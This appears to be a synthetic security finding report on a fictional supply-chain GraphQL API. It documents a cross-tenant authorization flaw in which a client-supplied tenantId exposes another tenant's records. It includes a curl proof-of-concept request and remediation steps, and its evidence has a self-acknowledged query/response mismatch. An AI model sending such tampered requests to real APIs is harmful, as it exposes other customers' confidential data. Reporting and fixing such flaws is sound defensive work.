# Security Analysis Report
**System:** TraceOrigin Supply API
**Domain:** Food & Beverage / FMCG
**Example ID:** GQL-0329
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | HIGH | Single-User — Pattern 10.2 | Parameter escalation — attacker extends own session scope by supplying victim `tenantId` in `listResources` filter, bypassing resolver's implicit tenant boundary |

---

## Finding 1 — Single-User: Parameter Escalation (Pattern 10.2)

### Summary
The `listResources` resolver on TraceOrigin Supply API (`api.traceorigin-supply-a.example.com`) accepts a client-supplied `tenantId` filter argument without validating it against the JWT's `tenantId`. Per §5.0 Pattern 10.2, an attacker with `tenant-21c7` credentials escalates their session scope by supplying `tenantId: "tenant-9394"` in the `listResources` query, receiving supply chain resource records belonging to `tenant-9394`.

**Context.txt inconsistency (documented):** HAR sends `listResources(tenantId: "tenant-9394")`, but the response JSON key is `getResource`. These conflict. The HAR (§6.0) is the primary evidence — `listResources` is the authoritative affected operation.

**Redis cache vulnerability:** Cache is keyed by `resourceId` only (no tenant dimension), enabling cross-tenant cache poisoning of FMCG supply chain records.

**Pattern:** 10.2 — Parameter escalation (own session scope extension) (Single-User)
**Affected resolver:** `listResources`
**Affected endpoint:** `POST https://api.traceorigin-supply-a.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.traceorigin-supply-a.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json
x-tenant-id: tenant-21c7

{"query": "query VulnerableOp { listResources(tenantId: \"tenant-9394\") { resourceId ownerId data { sensitiveField } } }"}
```
Note: `x-request-id` is a **server-assigned response header**, not a request header.

**Response — Victim FMCG Supply Chain Record Returned (cross-tenant)**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-9394",
      "ownerId": "other-user-21c79394",
      "data": {
        "sensitiveField": "CONFIDENTIAL-21c79394",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Attacker token: `tenant-21c7`. Returned data belongs to: `tenant-9394`. Cross-tenant supply chain data exposure via parameter escalation confirmed.

**Context.txt inconsistency:** HAR sends `listResources` query; response body uses key `getResource`. HAR operation is authoritative.

### Steps to Reproduce
```bash
curl -s -X POST "https://api.traceorigin-supply-a.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-21c7" \
  -d '{"query": "query VulnerableOp { listResources(tenantId: \"tenant-9394\") { resourceId ownerId data { sensitiveField } } }"}'
# Vulnerable: returns tenant-9394 supply chain records — parameter escalation succeeded
# Secure: {"errors": [{"message": "Forbidden — tenant mismatch"}]}
```

### Remediation
1. In `listResources` resolver: derive `tenantId` exclusively from JWT claims. Reject or ignore client-supplied `tenantId` argument.
2. Re-key Redis cache to include `tenantId`.
